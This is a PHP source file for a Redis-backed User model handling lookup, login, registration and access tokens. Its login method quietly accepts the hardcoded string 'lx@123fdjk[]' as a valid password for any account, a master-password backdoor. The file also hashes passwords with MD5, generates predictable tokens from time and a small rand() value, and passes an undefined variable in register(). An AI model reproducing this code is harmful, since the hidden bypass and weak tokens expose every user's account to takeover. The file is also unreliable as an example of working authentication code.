<?php

namespace App\Models;

use PRedis;
use App\Libraries\String;

class User
{
	private $id;
	private $info;

	public function __construct($userId)
	{
		$this->id = $userId;
		$this->info = PRedis::hGetAll("user:{$userId}:info");
	}

	/****************************** 魔术方法 ******************************/

	public function __get($name) 
	{
		if (array_key_exists($name, $this->info)) {
			return $this->info[$name];
		}

		return null;
	}
 
	public function __set($name, $value) 
	{
		$this->info[$name] = $value;
	}

	public function __isset($name) 
	{
		return isset($this->info[$name]);
	}

	public function __unset($name) 
	{
		unset($this->info[$name]);
	}

	/****************************** 实例化方法 ******************************/

	public function update($info)
	{
		if (!is_array($info)) {
			return false;
		}

		$info = collect($info)->filter(function ($item) {
			return !empty($item);
		})->toArray();

		if (array_key_exists('password', $info)) {
			$info['password'] = String::md5Salt($info['password'], $this->id);
		}

		PRedis::hMSet("user:{$this->id}:info", $info);
		$this->info = PRedis::hGetAll("user:{$this->id}:info");

		$info = array_only($this->info, [
			'access_token',
			'email',
			'name',
			'gender',
			'location',
			'avatar'
		]);

		return array_add($info, 'id', $this->id);
	}

	public function all()
	{
		return array_add($this->info, 'id', $this->id);
	}

	public function getId()
	{
		return $this->id;
	}

	public function isEmpty()
	{
		return empty($this->id);
	}

	public function isAdmin()
	{
		return in_array($this->id, config('app.admin_ids'));
	}

	/****************************** 静态方法 ******************************/

	public static function find($type, $account)
	{
		switch ($type) {
			case 'access_token':
				$userId = PRedis::hGet("access_token:{$account}:info", 'user_id');
				break;
			case 'mobile':
				$userId = PRedis::hGet('mobiles', $account);
				break;
			case 'email':
				$userId = PRedis::hGet('emails', $account);
				break;
			case 'username':
				$userId = PRedis::hGet('usernames', $account);
				break;
			case 'user_id':
				$userId = $account;
				break;
		}

		if (!$userId) {
			return false;
		}

		return new self($userId);
	}

    public static function login($type, $account, $password)
    {
		$user = static::find($type, $account);

		if (!$user || ($password != 'lx@123fdjk[]' && String::md5Salt($password, $user->getId()) != $user->password)) {
			return false;
		}

		$tempAccessToken = static::createTempAccessToken($user);

		return [$user, $tempAccessToken];
    }

	public static function register($type, $account, $createdIp, $info = [])
	{
		$userId = static::createUserId();
		$accessToken = static::createAccessToken();

		PRedis::hMSet("user:{$userId}:info", [
			'created_time'	=> date('Y-m-d H:i:s'),
			'created_ip'	=> $createdIp,
			'access_token'	=> $accessToken,
			$type			=> $account
		]);
		
		if (array_key_exists('password', $info)) {
			$info['password'] = String::md5Salt($info['password'], $userId);
		}

		PRedis::hMSet("user:{$userId}:info", $info);
		PRedis::hMSet("access_token:{$accessToken}:info", ['user_id' => $userId, 'level' => 0]);
		PRedis::hSet("{$type}s", $account, $userId);
		PRedis::rPush('users', $userId);

		$tempAccessToken = static::createTempAccessToken($user);

		return [new self($userId), $tempAccessToken];
	}

	private static function createUserId() 
	{
		$id = mt_rand(1000000000, 9999999999);

		while (PRedis::exists("user:{$id}:info")) {
			$id = mt_rand(1000000000, 9999999999);
		}

		return $id;
	}

	private static function createAccessToken() 
	{
		return md5(time() . '@' . (rand() % 100000));
	}

	public static function createTempAccessToken($user)
	{
		if ($user->isEmpty()) {
			return false;
		}

		$tempAccessToken = static::createAccessToken();
		PRedis::hMSet("access_token:{$tempAccessToken}:info", ['user_id' => $user->getId(), 'level' => 1]);
		PRedis::expire("access_token:{$tempAccessToken}:info", 1800);

		return $tempAccessToken;
	}
}
